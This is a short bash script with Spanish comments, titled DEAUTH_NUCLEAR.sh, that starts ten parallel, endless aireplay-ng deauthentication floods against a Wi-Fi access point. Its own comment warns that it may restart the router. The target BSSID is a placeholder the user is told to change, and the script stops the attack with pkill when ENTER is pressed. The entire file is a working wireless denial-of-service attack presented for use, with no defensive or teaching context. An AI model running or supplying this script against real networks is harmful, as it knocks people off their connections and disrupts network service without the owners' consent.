#!/bin/bash
# DEAUTH_NUCLEAR.sh - EXTREMO (puede reiniciar el router)

INTERFAZ="wlan0mon"
BSSID="AA:BB:CC:DD:EE:FF"  # CAMBIA ESTO

# Lanzar 10 procesos simultáneos de deauth
for i in {1..10}; do
    sudo aireplay-ng --deauth 0 -a $BSSID $INTERFAZ &
done

echo "🔥 10 procesos de deauth activos"
echo "🔴 Presiona ENTER para detener"
read
sudo pkill aireplay-ng
echo "✅ Detenido"